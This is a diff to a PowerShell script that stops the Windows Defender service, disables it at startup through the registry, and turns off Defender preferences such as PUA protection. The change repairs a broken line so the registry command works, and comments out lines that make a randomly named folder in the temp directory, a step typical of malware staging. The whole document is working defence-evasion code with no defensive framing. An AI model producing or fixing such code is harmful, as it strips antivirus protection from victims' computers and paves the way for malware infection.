@@ -12,9 +12,9 @@ function random_text{
 
 try {
     Get-Service WinDefend | Stop-Service -Force
-    Set-ItemProperty -Path
-    "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -value 4 -Type DWORD -Force
-} catch {
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -value 4 -Type DWORD -Force
+} 
+catch {
     Write-Warning "Failed to disable WinDefend service"
 }
 
@@ -47,10 +47,11 @@ try {
         Set-MpPreference -PUAProtection Disabled -Force -ea 0 | Out-Null
 
     }
-} catch {
+} 
+catch {
   Write-Warning "Failed to Disabled Defender"
 }
 
-cd $env:temp
-$directory_name = random_text
-mkdir $directory_name
+#cd $env:temp
+#$directory_name = random_text
+#mkdir $directory_name
